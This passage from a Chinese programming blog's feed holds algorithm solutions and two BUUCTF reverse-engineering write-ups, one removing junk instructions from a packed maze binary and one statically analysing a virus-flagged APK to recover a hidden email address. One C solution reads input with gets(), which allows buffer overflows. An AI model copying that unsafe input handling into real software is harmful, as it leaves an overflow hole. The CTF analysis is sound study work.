class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(l&lt;r)<br>        &#123;<br>            <span class="hljs-type">int</span> mid=(l+r)&gt;&gt;<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(nums[mid]&gt;=nums[<span class="hljs-number">0</span>])  l=mid+<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">else</span> r=mid;<br>        &#125;<br>        <span class="hljs-keyword">return</span> nums[l];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing68-0到n-1中缺失的数字"><a href="#AcWing68-0到n-1中缺失的数字" class="headerlink" title="AcWing68.0到n-1中缺失的数字"></a>AcWing68.0到n-1中缺失的数字</h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>这里看过题解以后有个巧解思路，即在整个数组有序的前提下，缺失一组数之后在这之后的数与其序号的差就会增大1个，以此来作为二分的判断条件，此题即可得解</p><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getMissingNumber</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(nums.<span class="hljs-built_in">empty</span>())    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>,r=nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(l&lt;r)<br>        &#123;<br>            <span class="hljs-type">int</span> mid=(l+r)&gt;&gt;<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(nums[mid]!=mid)  r=mid;<br>            <span class="hljs-keyword">else</span> l=mid+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(nums[r]==r)  r++;<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode.81-每日一题-搜索旋转排序数组 II</title>
      <link href="/2021/04/2cf5b000.html"/>
      <url>/2021/04/2cf5b000.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode81-搜索旋转排序数组-II"><a href="#LeetCode81-搜索旋转排序数组-II" class="headerlink" title="LeetCode81 搜索旋转排序数组 II"></a><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array-ii/">LeetCode81 搜索旋转排序数组 II</a></h2><p>本题分析到的最坏情况下的最好复杂度的解法均为线性解法，所以就拿线性解法做了，时间复杂度是O(n)</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">search</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;v:nums)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(v==target)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing22-旋转数组的最小数字"><a href="#AcWing22-旋转数组的最小数字" class="headerlink" title="AcWing22 旋转数组的最小数字"></a><a href="https://www.acwing.com/problem/content/20/">AcWing22 旋转数组的最小数字</a></h2><p>除了最后水平的一段（黑色水平那段）之外，其余部分满足二分性质：竖直虚线左边的数满足nums[i]≥nums[0]；而竖直虚线右边的数不满足这个条件。<br>分界点就是整个数组的最小值。</p><p>所以我们先将最后水平的一段删除即可。</p><p>这里还有一段y总的特殊情况的tip</p><blockquote><p>另外，不要忘记处理数组完全单调的特殊情况：</p><p>当我们删除最后水平的一段之后，如果剩下的最后一个数大于等于第一个数，则说明数组完全单调。</p></blockquote><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findMin</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n=nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">if</span>(n&lt;<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(n&gt;<span class="hljs-number">0</span> &amp;&amp; nums[n] == nums[<span class="hljs-number">0</span>])    n--;<br>        <span class="hljs-keyword">if</span>(nums[n]&gt;=nums[<span class="hljs-number">0</span>])    <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>, r=n;<br>        <span class="hljs-keyword">while</span>(l&lt;r)<br>        &#123;<br>            <span class="hljs-type">int</span> mid=l+r&gt;&gt;<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(nums[mid] &lt; nums[<span class="hljs-number">0</span>]) r=mid;<br>            <span class="hljs-keyword">else</span> l=mid+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> nums[r];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-RE-maze-花指令</title>
      <link href="/2021/04/b023ed3c.html"/>
      <url>/2021/04/b023ed3c.html</url>
      
        <content type="html"><![CDATA[<h2 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h2><p>下载文件并解压后，首先放入PEID检测</p><p>发现有UPX壳，快速脱壳后，再次检测，为VC++编写的32位程序，拖入IDA进行进一步分析</p><h2 id="相知"><a href="#相知" class="headerlink" title="相知"></a>相知</h2><p>一打开首先发现main函数无法编译，有一个地方函数出现了错误，初步判定为<strong>花指令</strong>，再查看字符串列表</p><p>由此可知，关键词并没有被IDA解析出引用，因此判定应该关键部分都在main函数内，那么下一步，就是把这个花指令处理以后就知道应该如何操作了</p><h2 id="整活"><a href="#整活" class="headerlink" title="整活"></a>整活</h2><p>在这一部分有一个jnz，有一个call，其中jnz函数只是往下跳了一行，因此应该为花指令，将其nop掉，发现下部分函数还是有错误，那函数内部还是有花指令，继续把这个函数转为数据模式</p><p>逐个NOP尝试后，发现只有将<code>0E8h</code>NOP以后后面的函数数据就会正常</p><p>接着再把这些数据转换回函数,反编译</p><p>接着回溯<code>asc_408078</code>和<code>dword_40807C</code>两个关键数据</p><p>由此可得最终的题意：初始的坐标为(7,0)最后要走到(5,-4)，然后将迷宫排版出来</p>]]></content>
      
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> buu </tag>
            
            <tag> 花指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode173-二叉搜索树</title>
      <link href="/2021/03/8f7221e8.html"/>
      <url>/2021/03/8f7221e8.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现一个二叉搜索树迭代器类BSTIterator ，表示一个按中序遍历二叉搜索树（BST）的迭代器：<br>BSTIterator(TreeNode root) 初始化 BSTIterator 类的一个对象。BST 的根节点 root 会作为构造函数的一部分给出。指针应初始化为一个不存在于 BST 中的数字，且该数字小于 BST 中的任何元素。<br>boolean hasNext() 如果向指针右侧遍历存在数字，则返回 true ；否则返回 false 。<br>int next()将指针向右移动，然后返回指针处的数字。<br>注意，指针初始化为一个不存在于 BST 中的数字，所以对 next() 的首次调用将返回 BST 中的最小元素。</p><p>你可以假设 next() 调用总是有效的，也就是说，当调用 next() 时，BST 的中序遍历中至少存在一个下一个数字。</p><p><img src="https://i.loli.net/2021/03/31/QEB5IZwK3kiNu6o.png" alt="img"></p><p>示例：</p><p>输入<br>[“BSTIterator”, “next”, “next”, “hasNext”, “next”, “hasNext”, “next”, “hasNext”, “next”, “hasNext”]<br>[[[7, 3, 15, null, null, 9, 20]], [], [], [], [], [], [], [], [], []]<br>输出<br>[null, 3, 7, true, 9, true, 15, true, 20, false]</p><p>解释<br>BSTIterator bSTIterator &#x3D; new BSTIterator([7, 3, 15, null, null, 9, 20]);<br>bSTIterator.next();    &#x2F;&#x2F; 返回 3<br>bSTIterator.next();    &#x2F;&#x2F; 返回 7<br>bSTIterator.hasNext(); &#x2F;&#x2F; 返回 True<br>bSTIterator.next();    &#x2F;&#x2F; 返回 9<br>bSTIterator.hasNext(); &#x2F;&#x2F; 返回 True<br>bSTIterator.next();    &#x2F;&#x2F; 返回 15<br>bSTIterator.hasNext(); &#x2F;&#x2F; 返回 True<br>bSTIterator.next();    &#x2F;&#x2F; 返回 20<br>bSTIterator.hasNext(); &#x2F;&#x2F; 返回 False</p><p>提示：</p><p>树中节点的数目在范围 [1, 105] 内<br>0 &lt;&#x3D; Node.val &lt;&#x3D; 106<br>最多调用 105 次 hasNext 和 next 操作</p><p>进阶：</p><p>你可以设计一个满足下述条件的解决方案吗？next() 和 hasNext() 操作均摊时间复杂度为 O(1) ，并使用 O(h) 内存。其中 h 是树的高度。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/binary-search-tree-iterator">https://leetcode-cn.com/problems/binary-search-tree-iterator</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>正好遇到这道题，梳理一下二叉树中序遍历的基本思路，即从先将所有的左子树从根节点开始全部压入一个栈中，然后进行中序遍历时先将当前节点输出，然后检查该节点是否有右子树，如果有的话就把右子树压入栈中，按照树结构建立的原理（即先左后右）此节点也必有左子树，只要把左子树输出后继续取出栈顶元素操作的步骤即可，这样遍历出来的树结构就是中序遍历后树结构</p><p><img src="https://i.loli.net/2021/03/31/QpqIVmg7b6ZRFPl.png" alt="img"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BSTIterator</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    stack&lt;TreeNode*&gt; stk;<br>    <span class="hljs-built_in">BSTIterator</span>(TreeNode* root) &#123;<br>        <span class="hljs-keyword">while</span>(root)&#123;<br>            stk.<span class="hljs-built_in">push</span>(root);<br>            root=root-&gt;left;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">next</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">auto</span> root=stk.<span class="hljs-built_in">top</span>();<br>        stk.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-type">int</span> val=root-&gt;val;<br>        root=root-&gt;right;<br>        <span class="hljs-keyword">while</span>(root)&#123;<br>            stk.<span class="hljs-built_in">push</span>(root);<br>            root=root-&gt;left;<br>        &#125;<br>        <span class="hljs-keyword">return</span> val;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasNext</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stk.<span class="hljs-built_in">size</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your BSTIterator object will be instantiated and called as such:</span><br><span class="hljs-comment"> * BSTIterator* obj = new BSTIterator(root);</span><br><span class="hljs-comment"> * int param_1 = obj-&gt;next();</span><br><span class="hljs-comment"> * bool param_2 = obj-&gt;hasNext();</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-相册-Android逆向初步</title>
      <link href="/2021/03/47225507.html"/>
      <url>/2021/03/47225507.html</url>
      
        <content type="html"><![CDATA[<p>题目中提示是拿到邮箱即为flag，又提示整个apk有病毒，那就只能从静态分析的角度看了。将xiangce1.apk拖入jadx后按照hint在全文中搜索mail关键词，找到了一个函数<code>sendMailByJavaMail</code></p><p><img src="https://i.loli.net/2021/03/30/uXv3yq6zOFWINHM.png" alt="img"></p><p>进入后详细查看</p><p><img src="https://i.loli.net/2021/03/30/z35SpItZTkmKiW9.png" alt="img"></p><p>这应该就是所要找的发送邮件的函数了，接着反找调用过它的地方</p><p><img src="https://i.loli.net/2021/03/30/1dgvOn6B8FCzl9M.png" alt="img"></p><p><img src="https://i.loli.net/2021/03/30/acdEgmGeyA2HZMN.png" alt="img"></p><p>到这一步已经看到发送邮件的变量了，回溯变量看到它的值是从本地文件内拿出来以后进行base64解密后即可得到答案，于是把<code>libcore.so</code>拖入IDA打开，并在字符串中找到相应的base64加密的字符串</p><p><img src="https://i.loli.net/2021/03/30/YXxNsnIDZT7FqAj.png" alt="img"></p><p>总共有三个字符串类似base64加密，一一尝试后发现第二个是邮箱地址<code>18218465125@163.com</code>，本题得解</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> buu </tag>
            
            <tag> Android逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>acwing1497-树的遍历</title>
      <link href="/2021/03/a9cc3b0f.html"/>
      <url>/2021/03/a9cc3b0f.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>一个二叉树，树中每个节点的权值互不相同。</p><p>现在给出它的后序遍历和中序遍历，请你输出它的层序遍历。</p><h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行包含整数 NN，表示二叉树的节点数。</p><p>第二行包含 NN 个整数，表示二叉树的后序遍历。</p><p>第三行包含 NN 个整数，表示二叉树的中序遍历。</p><h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一行 NN 个整数，表示二叉树的层序遍历。</p><h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤N≤301≤N≤30</p><h4 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">7</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">7</span> <span class="hljs-number">6</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><h4 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">4 </span><span class="hljs-number">1</span> <span class="hljs-number">6</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">7</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">40</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> postorder[N], inorder[N];<br>unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; l, r, pos;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">build</span><span class="hljs-params">(<span class="hljs-type">int</span> il, <span class="hljs-type">int</span> ir, <span class="hljs-type">int</span> pl, <span class="hljs-type">int</span> pr)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> root = postorder[pr];<br>    <span class="hljs-type">int</span> k = pos[root];<br>    <span class="hljs-keyword">if</span> (il &lt; k) l[root] = <span class="hljs-built_in">build</span>(il, k - <span class="hljs-number">1</span>, pl, pl + k - <span class="hljs-number">1</span> - il);<br>    <span class="hljs-keyword">if</span> (ir &gt; k) r[root] = <span class="hljs-built_in">build</span>(k + <span class="hljs-number">1</span>, ir, pl + k - <span class="hljs-number">1</span> - il + <span class="hljs-number">1</span>, pr - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bfs</span><span class="hljs-params">(<span class="hljs-type">int</span> root)</span></span><br><span class="hljs-function"></span>&#123;<br>    queue&lt;<span class="hljs-type">int</span>&gt; q;<br>    q.<span class="hljs-built_in">push</span>(root);<br>    <span class="hljs-keyword">while</span> (q.<span class="hljs-built_in">size</span>())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        cout &lt;&lt; t &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">if</span> (l.<span class="hljs-built_in">count</span>(t)) q.<span class="hljs-built_in">push</span>(l[t]);<br>        <span class="hljs-keyword">if</span> (r.<span class="hljs-built_in">count</span>(t)) q.<span class="hljs-built_in">push</span>(r[t]);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i ++ ) cin &gt;&gt; postorder[i];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i ++ )<br>    &#123;<br>        cin &gt;&gt; inorder[i];<br>        pos[inorder[i]] = i;<br>    &#125;<br>    <span class="hljs-type">int</span> root = <span class="hljs-built_in">build</span>(<span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">bfs</span>(root);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> acwing </tag>
            
            <tag> 树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>锐格-5812-题解</title>
      <link href="/2021/03/5135e9c8.html"/>
      <url>/2021/03/5135e9c8.html</url>
      
        <content type="html"><![CDATA[<p>这题实在是太坑了以至于有必要拿出来单独说一说</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://i.loli.net/2021/03/26/PWzuk3RhH4bmFw5.png" alt="img"></p><h2 id="BUGs"><a href="#BUGs" class="headerlink" title="BUGs"></a>BUGs</h2><p>一开始的逻辑做出来以后有一个很奇怪的现象，就是如果正常处理的话，那么有一组数据开头会多出来两个空格，然而当我debug时候把printf(“Reversal of sentence “);这一句最后的空格去掉以后，那三个空格又会全部消失…非常的灵异，而且一直无法复现这个数据究竟是怎么出来的</p><h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>在询问了老师和众多dalao后，我终于复现出来了这个问题，那就是当你在<code>you can swallow can&#39;t you?</code>最后一个单词you和问号之间打了空格的话，那么按照之前的处理逻辑，是以空格作为间隔符，而最后一个单词判断过程中最后一个单词的结束到问号之间没有再做判断，直接就放进了数组，同样，最后一个符号（在此处是问号）也只进行了非字符的判定，所以在上述情况，这个最后一个字符保存的还是一个空格，所以就会多出来两个空格，原来问题是出在这里。</p><p>知道了问题，解决起来就i比较简单了，我只要每次操作都先把空格排除在外，遇到非空格时候才继续进行读入操作，这样输出时候就不会有多余的空格出现了。</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>,n=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">1000</span>],word[<span class="hljs-number">50</span>][<span class="hljs-number">50</span>],c;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a sentence: &quot;</span>);<br>    gets(a);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Reversal of sentence: &quot;</span>);<br>    c=a[<span class="hljs-built_in">strlen</span>(a)<span class="hljs-number">-1</span>];<br>    a[<span class="hljs-built_in">strlen</span>(a)<span class="hljs-number">-1</span>]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-keyword">while</span>(a[i]!=<span class="hljs-string">&#x27;\0&#x27;</span>&amp;&amp;a[i]!=<span class="hljs-string">&#x27;\r&#x27;</span>&amp;&amp;a[i]!=<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        <span class="hljs-keyword">while</span>(a[i]==<span class="hljs-string">&#x27; &#x27;</span>)<span class="hljs-comment">//关键步骤</span><br>            i++;<br>        <span class="hljs-keyword">if</span>(a[i]==<span class="hljs-string">&#x27;\0&#x27;</span>||a[i]==<span class="hljs-string">&#x27;\r&#x27;</span>||a[i]==<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            <span class="hljs-keyword">break</span>;<br>        j=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(a[i]!=<span class="hljs-string">&#x27; &#x27;</span>&amp;&amp;a[i]!=<span class="hljs-string">&#x27;\r&#x27;</span>&amp;&amp;a[i]!=<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        &#123;<br>            word[n][j]=a[i];<br>            i++;j++;<br>        &#125;<br>        word[n][j]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br>        n++;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=n<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(i==n<span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,word[i]);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %s&quot;</span>,word[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c\n&quot;</span>,c);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-GUET-CTF2019-re</title>
